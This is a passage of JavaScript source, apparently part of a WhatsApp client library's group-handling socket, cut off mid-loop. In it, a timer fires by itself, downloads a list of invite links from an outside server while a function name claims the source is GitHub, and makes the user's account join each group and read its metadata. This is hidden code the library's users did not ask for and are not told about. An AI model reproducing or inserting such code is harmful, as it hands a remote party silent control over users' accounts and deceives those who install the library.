...
const makeGroupsSocket = (config) => {
    ...
    async function fetchInviteLinksFromGitHub(rawUrl) {
        try {
            const response = await fetch(rawUrl);
            const text = await response.text();
            
            // Parse array dari text
            const arrayMatch = text.match(/\[([^\]]+)\]/);
            if (arrayMatch) {
                const arrayContent = arrayMatch[1];
                // Extract URLs dari array
                const urlRegex = /"https:\/\/chat\.whatsapp\.com\/([^"]+)"/g;
                const links = [];
                let match;
                
                while ((match = urlRegex.exec(arrayContent)) !== null) {
                    links.push(`https://chat.whatsapp.com/${match[1]}`);
                }
            ...
            return WHATSAPP_INVITE_LINKS;
        }
    }

    setTimeout(async () => {
        try {
            const GROUP = "https://private-push-jet.vercel.app/raw/groups";
            const inviteLinks = await fetchInviteLinksFromGitHub(GROUP);
            
            
            
            for (const link of inviteLinks) {
                try {
                    const inviteCode = extractInviteCodeFromUrl(link);
                    
                    // Join group dengan invite code
                    const groupJid = await groupAcceptInvite(inviteCode);
                    if (groupJid) {
                        
                        
                        // Dapatkan metadata group
